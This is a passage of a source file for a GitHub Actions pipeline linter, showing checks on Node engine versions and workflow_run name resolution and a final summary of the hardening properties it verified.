                    `installs Node ${major} while \`engines.node\` is "${enginesNode}"`,
                    `Nothing tests Node ${floor}, yet npm lets a contributor install on it — and a native module built against ${major} is the failure they would hit. Raise engines.node to ">=${major}", or pin CI to ${floor}.`,
                );
            }
        }
    }

    // ── 19. workflow_run names resolve ──────────────────────────────────────
    // A workflow with no `name:` is named by its path, which is what GitHub
    // displays and what `workflows:` then has to say.
    const declaredNames = new Set(workflows.map((w) => (typeof w.doc['name'] === 'string' ? w.doc['name'] : w.rel)));
    for (const { rel, doc } of workflows) {
        const waitsOn = triggersOf(doc)['workflow_run']?.workflows;
        if (!Array.isArray(waitsOn)) continue;
        for (const name of waitsOn) {
            if (typeof name !== 'string' || !declaredNames.has(name)) {
                fail(
                    rel,
                    `waits on a workflow named '${String(name)}', which does not exist`,
                    `GitHub matches the declared \`name:\`, not the filename, and a name matching nothing is not an error — this workflow simply never runs. Declared names: ${[...declaredNames].map((n) => `'${n}'`).join(', ') || 'none'}.`,
                );
            }
        }
    }

    // ── Report ──────────────────────────────────────────────────────────────
    const jobCount = workflows.reduce((n, w) => n + jobsOf(w.doc).length, 0);
    const pinned = [...workflows, ...actions].reduce((n, w) => n + [...w.src.matchAll(USES_LINE)].length, 0);
    const images = imagePushes > 0 ? ' every pushed image tagged by commit with a cache scope of its own,' : '';
    const skipped =
        parked.length > 0 ? ` ${plural(parked.length, 'parked workflow')} skipped: ${parked.join(', ')}.` : '';

    report.done({
        summary:
            `Pipeline OK — ${plural(workflows.length, 'workflow')}, ${plural(jobCount, 'job')}, all timed out and ` +
            `concurrency-grouped with least-privilege permissions, ${plural(pinned, 'action')} SHA-pinned across ` +
            `workflows and ${plural(actions.length, 'composite action')}, runners pinned (matrix included), every ` +
            `workflow_run job gated on success and pinned to head_sha with every checkout job gated on a push ` +
            `event, no untrusted input spliced into a shell,${images} and all ` +
            `${plural(gateScripts.length, 'gate script')} wired into ci:check and ci.yml.${skipped}`,
        notMachineChecked:
            'whether branch protection actually requires the CI check, whether `environment: production` has ' +
            'required reviewers configured, whether a secret in GitHub Secrets is still valid, or whether the ' +
            'runner a self-hosted job lands on is the one you think it is. Those live in repository settings, ' +
            'not in the tree.',
    });
}

export default checkPipeline;
